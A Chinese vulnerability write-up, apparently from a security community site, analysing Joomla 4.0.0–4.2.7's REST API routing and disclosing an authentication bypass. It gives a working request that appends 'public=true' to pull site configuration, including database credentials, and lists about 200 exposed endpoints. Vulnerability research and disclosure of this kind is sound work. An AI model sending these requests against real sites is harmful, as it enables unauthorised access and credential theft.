<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/12175)

> 先知社区，先知安全技术社区

​ 由于公司对漏洞的要求比较高，代码审计很快集中到了请求路由的代码块。不管是 Wordpress/RounderCube 还是 PhpMyAdmin 以及一些知名度比较高的 php 应用（一个 Java 安全研究员感到头皮发麻），我的重点对象变成了请求路由的代码追踪，一旦分析经过路由选择之后，剩下的业务代码我是完全不看了。虽然有点不专业，但是这是挖掘未授权漏洞最好的道路，最终终于找到了一个不错的高危漏洞——Joomla 未授权访问 Rest API。

受影响版本
-----

​ Joomla 大致有三个路由入口，分别是

1.  根目录的 index.php(用户访问文章)
2.  根目录的 administrator/index.php(管理员管理)
3.  根目录的 api/index.php(开发者爱好的 Rest API)

未授权的接口正是第三个入口。因此影响的只有 Joomla4.0.0——Joomla4.2.7（Rest API 4.x 正式开发）

分析
--

​ 这里仅重点分析 api/index.php 这个路由的问题（index.php 和 administrator/index.php 找不到漏洞）。

网站输入 / api/index.php 开启 debug 模式

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230217104540-2ab273ae-ae6d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230217104540-2ab273ae-ae6d-1.png)

index.php 会来到 app.php。其中 $app 主要的 input 成员存放所有的 HTTP 请求参数

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230217104656-57af304a-ae6d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230217104656-57af304a-ae6d-1.png)

在 execute() 函数中，会经过 sanityCheckSystemVariables 函数，此函数用来过滤渲染模板的参数，主要防止 XSS 漏洞。setupLogging 和 createExtensionNameSpaceMap 主要是系统的额外记录工作。doExecute 就是具体的路由逻辑函数。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230217104638-4ce03a7e-ae6d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230217104638-4ce03a7e-ae6d-1.png)

doExecute 中最重要的就是 route 和 dispatch 函数。

### route：路由选择与鉴权

​ 整个 route 函数分为两部分，路由选择和身份校验。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230217104711-60c841f8-ae6d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230217104711-60c841f8-ae6d-1.png)

逻辑十分清晰，主要是直接通过 parseApiRoute 函数从请求的方法和 url 到 $routers 中找到对应的路由信息

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230217104730-6bbcc598-ae6d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230217104730-6bbcc598-ae6d-1.png)

身份验证的代码加上 debug 信息可以知道 public 参数控制着 API 是否对外开放。默认情况下是 false，不对外开放。但是这里大部分情况都会选择直接下一步。但是回过头看路由获取 parseApiRoute 时会有新的发现

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230217104752-793cb386-ae6d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230217104752-793cb386-ae6d-1.png)

这里发送请求

```
http://x.x.x.x/api/index.php/v1/banners?public=true

```

再来看 route 变量会发现惊喜

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230217104822-8af55b28-ae6d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230217104822-8af55b28-ae6d-1.png)

此时 route.var 中的变量会被请求的变量覆盖。由于 public=true，所以接口不需要身份验证，直接到达路由分发，也就是业务逻辑。

受损的 API 清单
----------

​ 由于能够直接访问 API 了，从中找到最终的信息即可。

```
/api/index.php/v1/config/application?public=true

```

此 API 用于获取网站最重要的配置信息，其中包含数据库的账号与密码。

其他受损 API 如下

```
v1/banners
v1/banners/:id
v1/banners
v1/banners/:id
v1/banners/:id
v1/banners/clients
v1/banners/clients/:id
v1/banners/clients
v1/banners/clients/:id
v1/banners/clients/:id
v1/banners/categories
v1/banners/categories/:id
v1/banners/categories
v1/banners/categories/:id
v1/banners/categories/:id
v1/banners/:id/contenthistory
v1/banners/:id/contenthistory/keep
v1/banners/:id/contenthistory
v1/config/application
v1/config/application
v1/config/:component_name
v1/config/:component_name
v1/contacts/form/:id
v1/contacts
v1/contacts/:id
v1/contacts
v1/contacts/:id
v1/contacts/:id
v1/contacts/categories
v1/contacts/categories/:id
v1/contacts/categories
v1/contacts/categories/:id
v1/contacts/categories/:id
v1/fields/contacts/contact
v1/fields/contacts/contact/:id
v1/fields/contacts/contact
v1/fields/contacts/contact/:id
v1/fields/contacts/contact/:id
v1/fields/contacts/mail
v1/fields/contacts/mail/:id
v1/fields/contacts/mail
v1/fields/contacts/mail/:id
v1/fields/contacts/mail/:id
v1/fields/contacts/categories
v1/fields/contacts/categories/:id
v1/fields/contacts/categories
v1/fields/contacts/categories/:id
v1/fields/contacts/categories/:id
v1/fields/groups/contacts/contact
v1/fields/groups/contacts/contact/:id
v1/fields/groups/contacts/contact
v1/fields/groups/contacts/contact/:id
v1/fields/groups/contacts/contact/:id
v1/fields/groups/contacts/mail
v1/fields/groups/contacts/mail/:id
v1/fields/groups/contacts/mail
v1/fields/groups/contacts/mail/:id
v1/fields/groups/contacts/mail/:id
v1/fields/groups/contacts/categories
v1/fields/groups/contacts/categories/:id
v1/fields/groups/contacts/categories
v1/fields/groups/contacts/categories/:id
v1/fields/groups/contacts/categories/:id
v1/contacts/:id/contenthistory
v1/contacts/:id/contenthistory/keep
v1/contacts/:id/contenthistory
v1/content/articles
v1/content/articles/:id
v1/content/articles
v1/content/articles/:id
v1/content/articles/:id
v1/content/categories
v1/content/categories/:id
v1/content/categories
v1/content/categories/:id
v1/content/categories/:id
v1/fields/content/articles
v1/fields/content/articles/:id
v1/fields/content/articles
v1/fields/content/articles/:id
v1/fields/content/articles/:id
v1/fields/content/categories
v1/fields/content/categories/:id
v1/fields/content/categories
v1/fields/content/categories/:id
v1/fields/content/categories/:id
v1/fields/groups/content/articles
v1/fields/groups/content/articles/:id
v1/fields/groups/content/articles
v1/fields/groups/content/articles/:id
v1/fields/groups/content/articles/:id
v1/fields/groups/content/categories
v1/fields/groups/content/categories/:id
v1/fields/groups/content/categories
v1/fields/groups/content/categories/:id
v1/fields/groups/content/categories/:id
v1/content/articles/:id/contenthistory
v1/content/articles/:id/contenthistory/keep
v1/content/articles/:id/contenthistory
v1/extensions
v1/languages/content
v1/languages/content/:id
v1/languages/content
v1/languages/content/:id
v1/languages/content/:id
v1/languages/overrides/search
v1/languages/overrides/search/cache/refresh
v1/languages/overrides/site/zh-CN
v1/languages/overrides/site/zh-CN/:id
v1/languages/overrides/site/zh-CN
v1/languages/overrides/site/zh-CN/:id
v1/languages/overrides/site/zh-CN/:id
v1/languages/overrides/administrator/zh-CN
v1/languages/overrides/administrator/zh-CN/:id
v1/languages/overrides/administrator/zh-CN
v1/languages/overrides/administrator/zh-CN/:id
v1/languages/overrides/administrator/zh-CN/:id
v1/languages/overrides/site/en-GB
v1/languages/overrides/site/en-GB/:id
v1/languages/overrides/site/en-GB
v1/languages/overrides/site/en-GB/:id
v1/languages/overrides/site/en-GB/:id
v1/languages/overrides/administrator/en-GB
v1/languages/overrides/administrator/en-GB/:id
v1/languages/overrides/administrator/en-GB
v1/languages/overrides/administrator/en-GB/:id
v1/languages/overrides/administrator/en-GB/:id
v1/languages
v1/languages
v1/media/adapters
v1/media/adapters/:id
v1/media/files
v1/media/files/:path/
v1/media/files/:path
v1/media/files
v1/media/files/:path
v1/media/files/:path
v1/menus/site
v1/menus/site/:id
v1/menus/site
v1/menus/site/:id
v1/menus/site/:id
v1/menus/administrator
v1/menus/administrator/:id
v1/menus/administrator
v1/menus/administrator/:id
v1/menus/administrator/:id
v1/menus/site/items
v1/menus/site/items/:id
v1/menus/site/items
v1/menus/site/items/:id
v1/menus/site/items/:id
v1/menus/administrator/items
v1/menus/administrator/items/:id
v1/menus/administrator/items
v1/menus/administrator/items/:id
v1/menus/administrator/items/:id
v1/menus/site/items/types
v1/menus/administrator/items/types
v1/messages
v1/messages/:id
v1/messages
v1/messages/:id
v1/messages/:id
v1/modules/types/site
v1/modules/types/administrator
v1/modules/site
v1/modules/site/:id
v1/modules/site
v1/modules/site/:id
v1/modules/site/:id
v1/modules/administrator
v1/modules/administrator/:id
v1/modules/administrator
v1/modules/administrator/:id
v1/modules/administrator/:id
v1/newsfeeds/feeds
v1/newsfeeds/feeds/:id
v1/newsfeeds/feeds
v1/newsfeeds/feeds/:id
v1/newsfeeds/feeds/:id
v1/newsfeeds/categories
v1/newsfeeds/categories/:id
v1/newsfeeds/categories
v1/newsfeeds/categories/:id
v1/newsfeeds/categories/:id
v1/plugins
v1/plugins/:id
v1/plugins/:id
v1/privacy/requests
v1/privacy/requests/:id
v1/privacy/requests/export/:id
v1/privacy/requests
v1/privacy/consents
v1/privacy/consents/:id
v1/privacy/consents/:id
v1/redirects
v1/redirects/:id
v1/redirects
v1/redirects/:id
v1/redirects/:id
v1/tags
v1/tags/:id
v1/tags
v1/tags/:id
v1/tags/:id
v1/templates/styles/site
v1/templates/styles/site/:id
v1/templates/styles/site
v1/templates/styles/site/:id
v1/templates/styles/site/:id
v1/templates/styles/administrator
v1/templates/styles/administrator/:id
v1/templates/styles/administrator
v1/templates/styles/administrator/:id
v1/templates/styles/administrator/:id
v1/users
v1/users/:id
v1/users
v1/users/:id
v1/users/:id
v1/fields/users
v1/fields/users/:id
v1/fields/users
v1/fields/users/:id
v1/fields/users/:id
v1/fields/groups/users
v1/fields/groups/users/:id
v1/fields/groups/users
v1/fields/groups/users/:id
v1/fields/groups/users/:id
v1/users/groups
v1/users/groups/:id
v1/users/groups
v1/users/groups/:id
v1/users/groups/:id
v1/users/levels
v1/users/levels/:id
v1/users/levels
v1/users/levels/:id
v1/users/levels/:id

```

复现
--

### 发送请求

```
http://127.0.0.1/api/index.php/v1/config/application?public=true

```

### 效果

[![](https://xzfile.aliyuncs.com/media/upload/picture/20230217104843-97984d40-ae6d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230217104843-97984d40-ae6d-1.png)